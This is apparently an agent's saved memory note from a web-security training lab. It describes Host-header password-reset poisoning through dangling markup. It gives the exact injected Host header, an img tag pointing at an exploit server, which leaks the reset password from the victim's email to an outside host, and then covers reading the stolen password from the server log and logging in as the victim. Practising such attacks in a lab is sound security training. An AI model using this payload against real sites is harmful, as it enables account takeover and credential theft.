---
metadata:
  node_type: memory
name: "Host-header reset poisoning via dangling markup"
description: "Password-reset dangling-markup technique: double-quoted img injected via Host header swallows the mail body into the exploit-server URL; password read from /log."
last_updated: 2026-10-11T04:44:37+08:00
created: 2026-10-11T04:44:37+08:00
---

Lab: host-header password-reset poisoning via dangling markup (academy, arm A).

Mechanism (verified end-to-end):
- Reset email template (raw): `<p>Please <a href='https://HOST/login'>click here</a> to login with your new password: PASS</p>...` — single quotes only, so the `/login'` quote is the last quote in the body.
- Reflect a double-quoted tag through the Host header: `Host: <lab-host>:'<img/src="https://<exploit-server>/?`
  The injected `'` closes the anchor href; the `"`-quoted `src` then swallows the whole remainder of the mail body (no `"` exists later), so the victim mail client requests `https://<exploit-server>/?/login'>click here</a> to login with your new password: PASS...</i>`.
- Read the password out of the exploit server access log (GET https://<exploit-server>/log). Victim render came from 10.0.4.35 within ~20 s.
- Log in as the victim with the leaked password; the lab flips `section.academyLabBanner.is-solved` on the /my-account terminal page (home banner may still read not-solved).

Tooling note: raw_http does NOT add Content-Length — supply `Content-Length: N` yourself, plus `Cookie: session=...`; it honours a caller-supplied Host verbatim (SNI/TCP still use the URL host).
